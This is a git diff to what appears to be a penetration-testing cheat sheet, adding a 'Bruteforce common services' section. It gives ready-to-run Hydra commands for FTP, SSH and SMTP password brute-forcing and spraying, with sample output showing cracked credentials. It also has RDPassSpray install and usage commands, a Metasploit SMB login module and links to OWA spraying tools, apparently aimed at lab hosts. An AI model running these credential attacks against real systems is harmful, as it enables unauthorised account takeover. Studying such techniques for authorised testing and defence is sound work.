@@ -26,9 +26,9 @@
 * [1. FTP (port 21)](#ftp-port-21)
 * [2. SSH (port 22)](#ssh-port-22)
 * [3. SMTP (port 25 - 465)](#smtp-port-25---465)
-* [4. Web login page](#web-login-page)
-* [5. RDP](#rdp)
-* [6. SMB](#smb)
+* [4. RDP (port 3389)](#rdp-port-3389)
+* [5. SMB (port 139 - 445)](#smb-port-139---445)
+* [6. Web login page](#web-login-page)
 * [7. Outlook web access (OWA) portal](#outlook-web-access-owa-portal)
 
 # 
@@ -321,5 +321,101 @@ WIP
 # 
 # ⭕ Bruteforce common services
 
+
 ## 🔻FTP (port 21)
 
+#### FTP password bruteforce using Hydra
+```
+#Details :
+# -l : ftp we are specifying a single username, use-L for a username wordlist
+# -P : Path specifying the full path of wordlist, you can specify a single password by using -p.
+# ftp://10.10.x.x : the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
+
+user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
+```
+
+
+## 🔻SSH (port 22)
+
+#### SSH password brutefrocing using Hydra
+```
+hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
+```
+
+#### SSH password spraying using Hydra
+
+➤ Using Hydra
+```
+user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+
+[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
+[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
+[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
+```
+
+
+## 🔻SMTP (port 25 - 465)
+
+#### SMTP password bruteforce using Hydra
+```
+user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking smtp://10.10.x.x:25/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
+[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+
+
+💥**Important note:** For 465 port
+```
+hydra -l pittman@clinic.thmredteam.com -P clinic.lst smtp://10.10.216.137:465 -v 
+```
+
+
+## 🔻RDP (port 3389)
+
+#### RDP password spraying
+
+➤ Using RDPPassSpray
+```
+Url : https://github.com/xFreed0m/RDPassSpray
+
+Install
+pip3 install -r requirements.txt
+apt-get install python-apt
+apt-get install xfreerdp
+
+Basic usage :
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+
+kiosec@cyberlab$:~# python3 RDPassSpray.py -U usernames-list.txt -p testPassword -d myCyberlab -T RDP_servers.txt
+```
+
+
+## 🔻SMB (port 139 - 445)
+
+Tool: Metasploit (auxiliary/scanner/smb/smb_login)
+
+
+## 🔻Web login page
+
+
+## 🔻Outlook web access (OWA) portal
+
+https://github.com/byt3bl33d3r/SprayingToolkit
+(atomizer.py)
+https://github.com/dafthack/MailSniper
